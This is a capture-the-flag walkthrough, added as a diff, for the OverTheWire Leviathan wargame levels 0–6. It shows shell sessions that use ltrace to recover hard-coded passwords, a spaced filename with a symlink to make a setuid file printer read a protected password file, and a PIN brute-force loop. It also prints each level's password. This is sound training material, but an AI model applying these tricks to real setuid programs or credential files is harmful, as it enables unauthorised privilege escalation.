@@ -1,0 +1,260 @@
+========================================================================================================================
+INTRO
+========================================================================================================================
+Dare you face the lord of the oceans?
+
+Leviathan is a wargame that has been rescued from the demise of intruded.net, previously 
+hosted on leviathan.intruded.net. Big thanks to adc, morla and reth for their help in 
+resurrecting this game!
+
+What follows below is the original description of leviathan, copied from intruded.net:
+
+Summary:
+Difficulty:     1/10
+Levels:         8
+Platform:   Linux/x86
+
+Author:
+Anders Tonfeldt
+
+Special Thanks:
+We would like to thank AstroMonk for coming up with a replacement idea for the last level,
+deadfood for finding a leveljump and Coi for finding a non-planned vulnerability.
+
+Description:
+This wargame doesn't require any knowledge about programming - just a bit of common
+sense and some knowledge about basic *nix commands. We had no idea that it'd be this
+hard to make an interesting wargame that wouldn't require programming abilities from 
+the players. Hopefully we made an interesting challenge for the new ones.
+
+Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on 
+leviathan.labs.overthewire.org through SSH on port 2223.
+
+To login to the first level use:
+
+Username: leviathan0
+Password: leviathan0
+
+Data for the levels can be found in the homedirectories. You can look at 
+/etc/leviathan_pass for the various level passwords.
+------------------------------------------------------------------------------------------------------------------------
+
+========================================================================================================================
+leviathan0
+========================================================================================================================
+pix@parrot:~$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+leviathan0@leviathan:~$ ls 
+leviathan0@leviathan:~$ ls -la 
+total 24
+drwxr-xr-x  3 root       root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
+drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26 22:26 .backup
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan0@leviathan:~$ ls .backup/
+bookmarks.html
+leviathan0@leviathan:~$ cat .backup/bookmarks.html | grep leviathan
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+
+========================================================================================================================
+Flag_Leviathan_00=[rioGegei8m]
+========================================================================================================================
+
+========================================================================================================================
+leviathan1
+========================================================================================================================
+pix@parrot:~$ ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+leviathan1@leviathan:~$ ls 
+check
+leviathan1@leviathan:~$ ./check 
+password: 1234
+Wrong password, Good Bye ...
+leviathan1@leviathan:~$ ltrace ./check 
+__libc_start_main(0x804853b, 1, 0xffffd774, 0x8048610 <unfinished ...>
+printf("password: ")                                                                = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700password: 1
+)                                               = 49
+getchar(1, 0, 0x65766f6c, 0x646f6700)                                               = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700
+)                                               = 10
+strcmp("1\n\n", "sex")                                                              = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)                                                = 29
++++ exited (status 0) +++
+leviathan1@leviathan:~$ ./check 
+password: sex
+$ ls 
+check
+$ whoami
+leviathan2
+$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+
+========================================================================================================================
+Flag_Leviathan_01=[ougahZi8Ta]
+========================================================================================================================
+
+========================================================================================================================
+leviathan2
+========================================================================================================================
+pix@parrot:~$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+leviathan2@leviathan:~$ ls -la 
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26 22:26 printfile
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan2@leviathan:~$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+leviathan2@leviathan:~$ mkdir /tmp/Pixailz && chmod 777 /tmp/Pixailz
+leviathan2@leviathan:~$ cd /tmp/Pixailz
+leviathan2@leviathan:/tmp/Pixailz$ touch "pass text.txt"
+leviathan2@leviathan:/tmp/Pixailz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/Pixailz/pass
+leviathan2@leviathan:/tmp/Pixailz$ ls -la
+total 228
+drwxrwxrwx    2 leviathan2 root         4096 Jan  4 03:22 .
+drwxrws-wt 3579 root       root       225280 Jan  4 03:22 ..
+lrwxrwxrwx    1 leviathan2 leviathan2     30 Jan  4 03:22 pass -> /etc/leviathan_pass/leviathan3
+-rw-r--r--    1 leviathan2 leviathan2      0 Jan  4 03:22 pass text.txt
+leviathan2@leviathan:/tmp/Pixailz$ ~/printfile "pass text.txt" 
+Ahdiemoo1j
+/bin/cat: text.txt: No such file or directory
+
+========================================================================================================================
+Flag_Leviathan_02=[Ahdiemoo1j]
+========================================================================================================================
+
+========================================================================================================================
+leviathan3
+========================================================================================================================
+pix@parrot:~$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+leviathan3@leviathan:~$ ls -la 
+total 32
+drwxr-xr-x  2 root       root        4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root        4096 Aug 26 22:26 ..
+-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan4 leviathan3 10288 Aug 26 22:26 level3
+-rw-r--r--  1 root       root         675 May 15  2017 .profile
+leviathan3@leviathan:~$ ltrace ./level3 
+__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka")                                                          = -1
+printf("Enter the password> ")                                                      = 20
+fgets(Enter the password> kakaka
+"kakaka\n", 256, 0xf7fc55a0)                                                  = 0xffffd590
+strcmp("h0no33\n", "snlprintf\n")                                                   = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                                                          = 19
++++ exited (status 0) +++
+leviathan3@leviathan:~$ ./level3 
+Enter the password> snlprintf
+[You've got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+========================================================================================================================
+Flag_Leviathan_03=[vuH0coox6m]
+========================================================================================================================
+
+========================================================================================================================
+leviathan4
+========================================================================================================================
+pix@parrot:~$ ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+leviathan4@leviathan:~$ ls -laR
+.:
+total 24
+drwxr-xr-x  3 root root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root root       4096 Aug 26 22:26 ..
+-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root root        675 May 15  2017 .profile
+dr-xr-x---  2 root leviathan4 4096 Aug 26 22:26 .trash
+
+./.trash:
+total 16
+dr-xr-x--- 2 root       leviathan4 4096 Aug 26 22:26 .
+drwxr-xr-x 3 root       root       4096 Aug 26 22:26 ..
+-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26 22:26 bin
+leviathan4@leviathan:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+#CyberChef decode from binary result :
+Tith4cokei
+
+========================================================================================================================
+Flag_Leviathan_04=[Tith4cokei]
+========================================================================================================================
+
+========================================================================================================================
+leviathan5
+========================================================================================================================
+pix@parrot:~$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+leviathan5@leviathan:~$ ls -laR
+.:
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26 22:26 leviathan5
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan5@leviathan:~$ ./leviathan5 
+UgaoFee4li
+
+========================================================================================================================
+Flag_Leviathan_05=[UgaoFee4li]
+========================================================================================================================
+
+========================================================================================================================
+leviathan6
+========================================================================================================================
+pix@parrot:~$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+leviathan6@leviathan:~$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan7 leviathan6 7452 Aug 26 22:26 leviathan6
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan6@leviathan:~$ ./leviathan6 
+usage: ./leviathan6 <4 digit code>
+leviathan6@leviathan:~$ mktemp -d
+/tmp/tmp.7YYJGJUE1P
+leviathan6@leviathan:~$ cd /tmp/tmp.7YYJGJUE1P
+leviathan6@leviathan:/tmp/tmp.7YYJGJUE1P$ touch brute.sh && chmod 777 brute.sh
+leviathan6@leviathan:/tmp/tmp.7YYJGJUE1P$ nano brute.sh
+leviathan6@leviathan:/tmp/tmp.7YYJGJUE1P$ cat brute.sh
+#!/bin/bash
+
+for pin in {0000..9999}; do
+	~/leviathan6 $pin && echo "$pin"
+done
+leviathan6@leviathan:/tmp/tmp.7YYJGJUE1P$ ./brute.sh 
+Wrong
+0000
+Wrong
+0001
+#after a will ...
+Wrong
+7121
+Wrong
+7122
+#a shell as spawned !
+$ whoami 
+leviathan7
+$ export SHELL=/bin/bash 
+$ $SHELL 
+leviathan7@leviathan:~$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
+========================================================================================================================
+Flag_Leviathan_06=[ahy7MaeBo9]
+========================================================================================================================
